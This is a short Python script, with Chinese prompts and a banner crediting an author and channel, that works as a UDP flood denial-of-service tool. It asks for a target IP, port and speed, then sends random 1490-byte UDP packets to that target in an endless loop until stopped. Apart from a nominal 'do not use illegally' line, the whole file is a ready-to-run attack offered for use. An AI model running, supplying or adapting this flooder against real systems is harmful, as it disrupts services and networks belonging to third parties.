import os
import socket
import random
import time
from datetime import datetime

# ASCII 字体标题
ascii_title = """
\033[31mMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
M       YMM M       YMM MMP     YMM MP       MM
M  mmmm   M M  mmmm   M M   mmm   M M  mmmmm  M
M  MMMMM  M M  MMMMM  M M  MMMMM  M M        YM
M  MMMMM  M M  MMMMM  M M  MMMMM  M MMMMMMM   M
M  MMMM   M M  MMMM   M M   MMM   M M   MMM   M
M        MM M        MM MMb     dMM Mb       dM
MMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMM MMMMMMMMMMM
"""
print(f"\033[35m作者——天神\033[0m")
# 清屏并打印 ASCII 标题
os.system("clear")
print(ascii_title)
print(" ")
print("\033[36m ")
print("\033[36m/---------------------------------------------------\\ ")
print("\033[36m|   作者          : sinkfall      天神                      |")
print("\033[36m|  我们终究在时间的长河中流逝 迷失自我             |")
print("\033[36m|   频道          : @pubgtianshenMOD                          |")
print("\033[36m\\---------------------------------------------------/") 
print("\033[36m ")
print("\033[36m -----------------[请勿用于违法用途]----------------- ")
print("\033[36m ")

# 获取用户输入
ip = input("请输入目标 IP 地址     : ")
port = int(input("请输入攻击端口         : "))
sd = int(input("请输入攻击速度(1~1000) : "))

# 初始化 Socket 和数据包
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# 清屏并显示攻击开始信息
os.system("clear")
print(ascii_title)
print("\n攻击已启动，请按 CTRL+C 停止...\n")

# 数据包发送循环
sent = 0
try:
    while True:
        sock.sendto(bytes, (ip, port))
        sent += 1
        print(f"\033[34m已发送 {sent} 个数据包到 {ip} 的端口 {port} 天生牛逼\033[0m")
        time.sleep((1000 - sd) / 2000)  # 调整攻击速度
except KeyboardInterrupt:
    print("\n攻击已停止。")
